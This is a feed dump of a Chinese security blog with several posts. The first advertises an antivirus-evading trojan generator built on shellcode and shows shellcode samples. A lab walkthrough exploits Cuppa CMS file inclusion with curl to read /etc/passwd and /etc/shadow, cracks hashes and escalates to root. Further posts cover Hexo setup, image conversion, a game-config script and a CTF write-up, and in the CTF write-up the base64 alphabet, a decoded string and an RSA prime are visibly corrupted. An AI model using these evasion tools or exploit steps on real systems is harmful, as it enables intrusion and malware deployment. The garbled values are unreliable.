<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   ____   __    __    _____      ______      _____</span><br><span class="line">  / ___)  ) )  ( (   (_   _)    (   __ \    (_   _)</span><br><span class="line"> / /     ( (    ) )    | |       ) (__) )     | |</span><br><span class="line">( (       ) )  ( (     | |      (    __/      | |</span><br><span class="line">( (      ( (    ) )    | |       ) \ \  _     | |</span><br><span class="line"> \ \___   ) \__/ (    _| |__    ( ( \ \_))   _| |__</span><br><span class="line">  \____)  \______/   /_____(     )_) \__/   /_____(</span><br><span class="line"></span><br><span class="line">摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马</span><br><span class="line"></span><br><span class="line">警告：</span><br><span class="line">1.本工具仅用于企业内部测试，请勿用于任何非法犯罪活动，否则后果自负</span><br><span class="line">2.本工具需要Go语言环境，且使用时需要关闭杀软</span><br><span class="line">https://github.com/NyDubh3/CuiRi   Author:Dubh3</span><br><span class="line"></span><br><span class="line">[INFO] Current Version: 1.0</span><br><span class="line">Usage of CuiRi.exe:</span><br><span class="line">  -f string</span><br><span class="line">        通过shellcode生成免杀马</span><br><span class="line">  -manual</span><br><span class="line">        查看shellcode生成方法</span><br></pre></td></tr></table></figure>

<p>CuiRi 支持的 shellcode 格式分为以下两种：</p>
<p><strong>1.C语言字符串格式 shellcode：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xd2\x51\x65\x48\x8b\x52\x60\x56\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>2.纯十六进制数值格式 shellcode:</strong></p>
<p>注意：如果是从 Cobalt Strike 中生成的 bin 文件，请单独将 bin 里的十六进制复制保存到一个 txt 文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fce8 8900 0000 6089 e531 d264 8b52 308b</span><br><span class="line">520c 8b52 148b 7228 0fb7 4a26 31ff 31c0</span><br><span class="line">ac3c 617c 022c 20c1 cf0d 01c7 e2f0 5257</span><br><span class="line">8b52 108b 423c 01d0 8b40 7885 c074 4a01</span><br><span class="line">d050 8b48 188b 5820 01d3 e33c 498b 348b</span><br><span class="line">01d6 31ff 31c0 acc1 cf0d 01c7 38e0 75f4</span><br><span class="line">037d f83b 7d24 75e2 588b 5824 01d3 668b</span><br></pre></td></tr></table></figure>

<h3 id="0x03-演示："><a href="#0x03-演示：" class="headerlink" title="0x03 演示："></a>0x03 演示：</h3><p><strong>(1) 生成 shellcode</strong></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/10/17/cuiri/3.jpg" alt="1" data-caption="1" loading="lazy"></p>
<p><strong>(2) 生成免杀马</strong></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/10/17/cuiri/4.jpg" alt="2" data-caption="2" loading="lazy"></p>
<p><strong>(3) 免杀效果</strong></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/10/17/cuiri/1.jpg" alt="3" data-caption="3" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/2022/10/17/cuiri/2.jpg" alt="4" data-caption="4" loading="lazy"></p>
]]></content>
  </entry>
  <entry>
    <title>使用Node.js + Hexo搭建本网站</title>
    <url>/2022/10/14/hello-world/</url>
    <content><![CDATA[<p>本来是不想写的,硬着头皮写完了.</p>
<h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><h3 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h3><p>自行安装Node.js并配置环境变量 不多做解释</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>

<h3 id="初始化网站"><a href="#初始化网站" class="headerlink" title="初始化网站"></a>初始化网站</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npx hexo init 文件名</span><br></pre></td></tr></table></figure>

<h3 id="安装必备的组件"><a href="#安装必备的组件" class="headerlink" title="安装必备的组件"></a>安装必备的组件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install</span><br></pre></td></tr></table></figure>

<h3 id="下载主题"><a href="#下载主题" class="headerlink" title="下载主题"></a>下载主题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">自己去https://hexo.io/themes/找 这不用教了 </span><br></pre></td></tr></table></figure>
<h3 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">将主题解压到网站根目录的themes文件夹下</span><br></pre></td></tr></table></figure>
<h3 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">打开根目录_config.yml配置文件</span><br><span class="line">theme:你的主题名</span><br></pre></td></tr></table></figure>

<h3 id="启动Hexo博客"><a href="#启动Hexo博客" class="headerlink" title="启动Hexo博客"></a>启动Hexo博客</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hexo s</span><br><span class="line"><span class="comment">#s是server的缩写</span></span><br></pre></td></tr></table></figure>

<p>Bye</p>
]]></content>
  </entry>
  <entry>
    <title>IMG转VMdk</title>
    <url>/2022/10/24/imggovmdk/</url>
    <content><![CDATA[<p>主要命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\qemu-img.exe info &#x27;源文件&#x27;</span><br><span class="line">.\qemu-img.exe convert -f qcow2 -O vmdk &#x27;源文件&#x27; &#x27;目标文件.vmdk&#x27;</span><br></pre></td></tr></table></figure>

<p>下载qemu</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/1.png" alt="1" data-caption="1" loading="lazy"></p>
<p>使用powershell进行转换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\qemu-img.exe info &#x27;源文件&#x27;</span><br><span class="line">.\qemu-img.exe convert -f qcow2 -O vmdk &#x27;源文件&#x27; &#x27;目标文件.vmdk&#x27;</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/images/2.png" alt="2" data-caption="2" loading="lazy"></p>
<p>转换成功导入虚拟机</p>
]]></content>
  </entry>
  <entry>
    <title>w1r3s-editable解题笔记</title>
    <url>/2022/12/11/w1r3s-editable/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描主机：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.20.0/24</span><br></pre></td></tr></table></figure>

<p>得到地址:192.168.20.150</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/63959399a24c3.png" alt="image-20221211161948618" data-caption="image-20221211161948618" loading="lazy"></p>
<p>扫描端口(建议扫两边)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -o- 192.168.20.150</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/63959426ce646.png" alt="image-20221211162613759" data-caption="image-20221211162613759" loading="lazy"></p>
<p>TCP扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -O -p21,22,80,3306 192.168.20.150 </span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395945631091.png" alt="image-20221211162701088" data-caption="image-20221211162701088" loading="lazy"></p>
<p>UDP扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU  -p21,22,80,3306 192.168.20.150</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395946de1c30.png" alt="image-20221211162724786" data-caption="image-20221211162724786" loading="lazy"></p>
<p>漏洞扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap --script=vuln -p21,22,80,3306 192.168.20.150</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/639595c5ed0ff.png" alt="image-20221211163308843" data-caption="image-20221211163308843" loading="lazy"></p>
<h2 id="漏洞测试"><a href="#漏洞测试" class="headerlink" title="漏洞测试"></a>漏洞测试</h2><h3 id="测试ftp"><a href="#测试ftp" class="headerlink" title="测试ftp"></a>测试ftp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp 192.168.20.150</span><br><span class="line">测试游客账号：anonymous</span><br><span class="line">密码空</span><br></pre></td></tr></table></figure>

<p>下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binary</span><br><span class="line">mget 0*.txt //批量下载</span><br><span class="line">get 文件</span><br></pre></td></tr></table></figure>

<p>查看下载文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hash-identifier //哈希识别器</span><br><span class="line">echo &#x27;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&#x27; | base64 -d  //解base64</span><br></pre></td></tr></table></figure>

<h3 id="测试Web"><a href="#测试Web" class="headerlink" title="测试Web"></a>测试Web</h3><p>目录爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster -u http://192.168.20.150 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt </span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit cuppa cms //搜搜漏洞利用文件</span><br><span class="line">searchsploit cuppa cms -m 25971//下载文件</span><br><span class="line">http://192.168.20.150/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.20.150/administrator/alerts/alertConfigField.php</span><br><span class="line"></span><br><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/passwd http://192.168.20.150/administrator/alerts/alertConfigField.php | html2text</span><br><span class="line"></span><br><span class="line">curl --data-urlencode urlConfig=../../../../../../../../../etc/shadow http://192.168.20.150/administrator/alerts/alertConfigField.php | html2text</span><br><span class="line"></span><br><span class="line">john hash </span><br><span class="line">john --show haxi</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/639596235a78e.png" alt="image-20221207131226579" data-caption="image-20221207131226579" loading="lazy"></p>
<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>登录ssh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami //查看权限</span><br><span class="line">uname -a</span><br><span class="line">sudo -l</span><br><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/6395969956b40.png" alt="image-20221211163640190" data-caption="image-20221211163640190" loading="lazy"></p>
<p>拿到权限获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cat flag</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/11/639596e6477b5.png" alt="image-20221211163757184" data-caption="image-20221211163757184" loading="lazy"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>原神换服</title>
    <url>/2022/12/15/%E5%8E%9F%E7%A5%9E%E6%9C%8D%E5%8A%A1%E5%8C%BA%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><p>xx.vbs</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;time：20221215</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dim fz</span><br><span class="line">set fz = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">call fz.CopyFile(&quot;config.ini&quot;, &quot;config.ini7&quot;) &#x27;两个参数的文件名部分可以不同</span><br><span class="line">set fz = nothing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dim fso, f</span><br><span class="line">set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">set f = fso.OpenTextFile(&quot;config.ini&quot;, 2, false) &#x27;第二个参数 2 表示重写，如果是 8 表示追加</span><br><span class="line">&#x27;f.Write(&quot;写入内容&quot;)</span><br><span class="line">&#x27;f.WriteLine(&quot;写入内容并换行&quot;)</span><br><span class="line">&#x27;f.WriteBlankLines(3) &#x27;写入三个空白行（相当于在文本编辑器中按三次回车）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msgbox &quot;作者QQ2565543706&quot;&amp;chr(10)&amp;&quot;B服选择:1!&quot;&amp;chr(10)&amp;&quot;官服选择:2!&quot;</span><br><span class="line">dim a</span><br><span class="line">a=0</span><br><span class="line">do while a=0</span><br><span class="line">a = inputbox (&quot;b服选择:1!&quot;&amp;chr(10)&amp;&quot;官服选择:2!&quot;&amp;chr(10)&amp;&quot;请不要输入其他东西！&quot;&amp;chr(10)&amp;&quot;有问题qq:2565543706&quot;&amp;chr(10)&amp;&quot;后缀为.ini7的是备份文件.&quot;&amp;chr(10)&amp;&quot;出现其他问题可重命名（删除后缀上的“7”）文件恢复备份&quot;,&quot;电脑原神服务器修改1.0&quot;)</span><br><span class="line">Loop</span><br><span class="line">IF a=1 Then </span><br><span class="line">f.WriteLine(&quot;[General]&quot;)</span><br><span class="line">f.WriteLine(&quot;channel=14&quot;)</span><br><span class="line">f.WriteLine(&quot;cps=bilibili&quot;)</span><br><span class="line">f.WriteLine(&quot;sub_channel=0&quot;)</span><br><span class="line">f.WriteLine(&quot;game_version=3.3.0&quot;)</span><br><span class="line">f.WriteLine(&quot;plugin_5_version=2.6.0&quot;)</span><br><span class="line">f.WriteLine(&quot;plugin_sdk_version=3.5.0&quot;)</span><br><span class="line">msgbox &quot;成功修改为B服&quot;</span><br><span class="line">ElseIf a=2 Then </span><br><span class="line">f.WriteLine(&quot;[General]&quot;)</span><br><span class="line">f.WriteLine(&quot;channel=1&quot;)</span><br><span class="line">f.WriteLine(&quot;cps=mihoyo&quot;)</span><br><span class="line">f.WriteLine(&quot;sub_channel=1&quot;)</span><br><span class="line">f.WriteLine(&quot;game_version=3.3.0&quot;)</span><br><span class="line">f.WriteLine(&quot;plugin_5_version=2.6.0&quot;)</span><br><span class="line">f.WriteLine(&quot;plugin_sdk_version=3.5.0&quot;)</span><br><span class="line">msgbox &quot;成功修改为官服&quot;</span><br><span class="line">else msgbox &quot;我不理解！&quot;</span><br><span class="line">End If</span><br><span class="line">f.Close()</span><br><span class="line">set f = nothing</span><br><span class="line">set fso = nothing</span><br></pre></td></tr></table></figure>

<h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h2><p>吧xx.vbs放在Genshin Impact下右键发送至桌面。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/15/639ae7a6cf890.png" alt="image-20221215172339112" data-caption="image-20221215172339112" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/15/639ae7ecb40c4.png" alt="image-20221215172456918" data-caption="image-20221215172456918" loading="lazy"></p>
<p>双击启动即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1是哔服</span><br><span class="line">2是官服</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>游戏</tag>
      </tags>
  </entry>
  <entry>
    <title>山东省&quot;技能兴鲁-网络安全赛道&quot;职业技能大赛WriteUp</title>
    <url>/2022/12/23/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/</url>
    <content><![CDATA[<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc-pyc"><a href="#misc-pyc" class="headerlink" title="misc_pyc"></a>misc_pyc</h3><p>用uncompyle6反编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">flag_2 = &#x27;*****&#x27;</span><br><span class="line">bin_str = &#x27;&#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;).zfill(8) for c in flag_2])</span><br><span class="line">base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTKipLNneNhQLR8xeL8rP12aDox5DmYSrcB3456789+/&#x27;</span><br><span class="line">with open(&#x27;0.txt&#x27;, &#x27;rb&#x27;) as (f0):</span><br><span class="line">    with open(&#x27;1.txt&#x27;, &#x27;wb&#x27;) as (f1):</span><br><span class="line">        for line in f0.readlines():</span><br><span class="line">            rowstr = base64.b64encode(line.replace(b&#x27;\n&#x27;, b&#x27;&#x27;))</span><br><span class="line">            equalnum = rowstr.count(b&#x27;=&#x27;)</span><br><span class="line">            if equalnum:</span><br><span class="line">                if len(bin_str):</span><br><span class="line">                    offset = int(&#x27;0b&#x27; + bin_str[:equalnum * 2], 2)</span><br><span class="line">                    char = rowstr[(len(rowstr) - equalnum - 1)]</span><br><span class="line">                    char = chr(char)</span><br><span class="line">                    rowstr = rowstr.replace(char.encode(), base64chars[(base64chars.index(char) + offset)].encode())</span><br><span class="line">                    bin_str = bin_str[equalnum * 2:]</span><br><span class="line">            f1.write(rowstr + b&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">what_f1_write = [</span><br><span class="line"> &#x27;YQ1=&#x27;,</span><br><span class="line"> &#x27;Yg3=&#x27;,</span><br><span class="line"> &#x27;Yw0=&#x27;,</span><br><span class="line"> &#x27;ZA3=&#x27;,</span><br><span class="line"> &#x27;ZQ1=&#x27;,</span><br><span class="line"> &#x27;Zg0=&#x27;,</span><br><span class="line"> &#x27;Zw1=&#x27;,</span><br><span class="line"> &#x27;aA1=&#x27;,</span><br><span class="line"> &#x27;aQ0=&#x27;,</span><br><span class="line"> &#x27;ag3=&#x27;,</span><br><span class="line"> &#x27;aw1=&#x27;,</span><br><span class="line"> &#x27;bA2=&#x27;,</span><br><span class="line"> &#x27;bQ0=&#x27;,</span><br><span class="line"> &#x27;bg3=&#x27;,</span><br><span class="line"> &#x27;bw1=&#x27;,</span><br><span class="line"> &#x27;cA0=&#x27;,</span><br><span class="line"> &#x27;cQ1=&#x27;,</span><br><span class="line"> &#x27;cg3=&#x27;,</span><br><span class="line"> &#x27;c9==&#x27;]</span><br></pre></td></tr></table></figure>

<p>base64隐写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import base64</span><br><span class="line">b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTKipLNneNhQLR8xeL8rP12aDox5DmYSrcB3456789+/&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">what_f1_write = [&#x27;YQ1=&#x27;,&#x27;Yg3=&#x27;,&#x27;Yw0=&#x27;,&#x27;ZA3=&#x27;,&#x27;ZQ1=&#x27;,&#x27;Zg0=&#x27;,&#x27;Zw1=&#x27;,&#x27;aA1=&#x27;,&#x27;aQ0=&#x27;,&#x27;ag3=&#x27;,</span><br><span class="line">&#x27;aw1=&#x27;,&#x27;bA2=&#x27;,&#x27;bQ0=&#x27;,&#x27;bg3=&#x27;,&#x27;bw1=&#x27;,&#x27;cA0=&#x27;,&#x27;cQ1=&#x27;,&#x27;cg3=&#x27;,&#x27;c9==&#x27;]</span><br><span class="line"></span><br><span class="line">bin_str = &#x27;&#x27;</span><br><span class="line">for stegb64 in what_f1_write:</span><br><span class="line">    # stegb64 = str(line, &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">    rowb64 = str(base64.b64encode(base64.b64decode(stegb64)), &quot;utf-8&quot;).strip(&quot;\n&quot;)</span><br><span class="line">    offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;, &#x27;&#x27;).replace(&#x27;\r&#x27;,&#x27;&#x27;)[-1]) - b64chars.index(rowb64.replace(&#x27;=&#x27;, &#x27;&#x27;)[-1]))</span><br><span class="line">    equalnum = stegb64.count(&#x27;=&#x27;)  # no equalnum no offset</span><br><span class="line">    if equalnum:</span><br><span class="line">        bin_str += bin(offset)[2:].zfill(equalnum * 2)</span><br><span class="line">    print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in range(0, len(bin_str), 8)]))</span><br></pre></td></tr></table></figure>

<p>得到结果 sE64}</p>
<p>再去用pyc隐写解前半段</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://mmbiz.qpic.cn/mmbiz_png/HY8Njk7u4fRlWMnpqsx2ndhRicSeaPaOu3m6HiaVnzPsGe6oM73gPSsM5s19fbWZVZyVjXSlnxo3nHiade9wc5Qqw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片" data-caption="图片" loading="lazy"></p>
<p>拼起来得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;pyc&amp;bAsE64&#125;</span><br></pre></td></tr></table></figure>

<h3 id="好玩的编码"><a href="#好玩的编码" class="headerlink" title="好玩的编码"></a>好玩的编码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5230307a5631465756444a4e576c6c4852566c4d4d6b3953535555794d30745454454a4a52454e54576c704a556b5a584e6b355454453431574668425430784b546c704a555430395054303d</span><br></pre></td></tr></table></figure>

<p>解hex16：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R00zV1FWVDJNWllHRVlMMk9SSUUyM0tTKipLNneNhQLR8xeL8rP12aDox5DmYSrcBDmYSrcB</span><br></pre></td></tr></table></figure>

<p>magic：base32再58：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W0w_You_ar3_great&#125;</span><br></pre></td></tr></table></figure>

<h3 id="happyImg"><a href="#happyImg" class="headerlink" title="happyImg"></a>happyImg</h3><p>stegsolve左右翻发现一个密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!QAZXSW@1qazxsw2</span><br></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56da3a0e26.png" alt="image-20221223165810295" data-caption="image-20221223165810295" loading="lazy"></p>
<p>lsb隐写,red，blue为0。</p>
<p>保存为bin，记事本打开看到flag.png，改名为压缩包，输入密码，得到flag</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56ddbd3187.png" alt="image-20221223165906521" data-caption="image-20221223165906521" loading="lazy"></p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56de95c053.png" alt="image-20221223165920078" data-caption="image-20221223165920078" loading="lazy"></p>
<h3 id="网络寻综"><a href="#网络寻综" class="headerlink" title="网络寻综"></a>网络寻综</h3><p>看图是哈穆迪清真寺</p>
<p>谷歌搜mosquee AI-Hamoudi phone</p>
<p>看到电话</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56e0b308c7.png" alt="image-20221223165953829" data-caption="image-20221223165953829" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;+25377865774&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="3des"><a href="#3des" class="headerlink" title="3des"></a>3des</h3><p>给了一个java文件和一个加密结果</p>
<p>算法就是tripleDES</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.spec.IvParameterSpec;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line">class Crypto &#123;</span><br><span class="line"></span><br><span class="line">    private static String KEY = &quot;@2AzsQ#Hnx%XTosMR6$LtEKD&quot;;</span><br><span class="line">    private static String IV = &quot;CpEF7SDz&quot;;</span><br><span class="line"></span><br><span class="line">    public static String encrypt(String data) throws Exception &#123;</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DESede/CBC/PKCS5Padding&quot;);</span><br><span class="line">        SecretKeySpec secretKeySpec = new SecretKeySpec(KEY.getBytes(), &quot;DESede&quot;);</span><br><span class="line">        IvParameterSpec ivParameterSpec = new IvParameterSpec(IV.getBytes());</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, ivParameterSpec);</span><br><span class="line">        byte[] encrypted = cipher.doFinal(data.getBytes(&quot;UTF-8&quot;));</span><br><span class="line">        return bytes2hexstr(encrypted);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String bytes2hexstr(byte[] buf) &#123;</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        for (int i = 0; i &lt; buf.length; i++) &#123;</span><br><span class="line">            String hex = Integer.toHexString(buf[i] &amp; 0xFF);</span><br><span class="line">            if (hex.length() == 1) &#123;</span><br><span class="line">                hex = &#x27;0&#x27; + hex;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(hex.toLowerCase());</span><br><span class="line">        &#125;</span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        System.out.println(encrypt(&quot;flag&#123;xxx&#125;&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>key&#x3D;@2AzsQ#Hnx%XTosMR6$LtEKD</p>
<p>IV&#x3D;CpEF7SDz</p>
<p>算法CBC&#x2F;PKCS5Padding</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="http://img.luminesight.com/img/2022/12/23/63a56e5171f45.png" alt="image-20221223170104150" data-caption="image-20221223170104150" loading="lazy"></p>
<h3 id="happyRSA"><a href="#happyRSA" class="headerlink" title="happyRSA"></a>happyRSA</h3><p>给了pqenc</p>
<p>但是e是phi_n的因数</p>
<p>用AMM在有限域内开方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#sage</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">p = 97559992143538505823351615639211763734311559951587665014345919747733390740450790273359386575890798160795025626573580365828156108078100621074495137190416226109270591884516099679926053478560750986193065549865131400457769381398338702594631516054868885157801055786648957386508374821243393633398068286519087291899</span><br><span class="line">e = 223</span><br><span class="line">q = 39f36dNMc5CmshUCPAH1VsCv4A84pGdSyu61654473174790323208128426716523786159389593732096324499033892465876683490515456465981922248571768795221792067055550876465089846480000103207743072486330333647531692833975457277965585913100536970416049033758578728704151353769882703817603346904165274693820583811661679269246933</span><br><span class="line">c = 8310151988085860771226135398874764307621316769660563267495107758782855420167201345224621932233009864886459191650276831555553606018772356624861344010051427084784712615419584399034171295434663517111130692609510225248850800086750351336299722121740091690781297611587292792380263994661373171593543809045588215109967008287273462651359353786188222933360961215432623197670015133463997036747979075992284955864774118038735419327630590319728196257908297742808557311174379279085833900573941668601788656519597930019583786869324790276024107739682158108450127890693464079075924933789639419538796893294354565682012619667240947317948</span><br><span class="line">n = p*q</span><br><span class="line">def AMM(o, r, q):</span><br><span class="line">    start = time.time()</span><br><span class="line">    print(&#x27;\n----------------------------------------------------------------------------------&#x27;)</span><br><span class="line">    print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;)</span><br><span class="line">    print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q))</span><br><span class="line">    g = GF(q)</span><br><span class="line">    o = g(o)</span><br><span class="line">    p = g(random.randint(1, q))</span><br><span class="line">    while p ^ ((q-1) // r) == 1:</span><br><span class="line">        p = g(random.randint(1, q))</span><br><span class="line">    print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p))</span><br><span class="line">    t = 0</span><br><span class="line">    s = q - 1</span><br><span class="line">    while s % r == 0:</span><br><span class="line">        t += 1</span><br><span class="line">        s = s // r</span><br><span class="line">    print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t))</span><br><span class="line">    k = 1</span><br><span class="line">    while (k * s + 1) % r != 0:</span><br><span class="line">        k += 1</span><br><span class="line">    alp = (k * s + 1) // r</span><br><span class="line">    print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp))</span><br><span class="line">    a = p ^ (r**(t-1) * s)</span><br><span class="line">    b = o ^ (r*alp - 1)</span><br><span class="line">    c = p ^ s</span><br><span class="line">    h = 1</span><br><span class="line">    for i in range(1, t):</span><br><span class="line">        d = b ^ (r^(t-1-i))</span><br><span class="line">        if 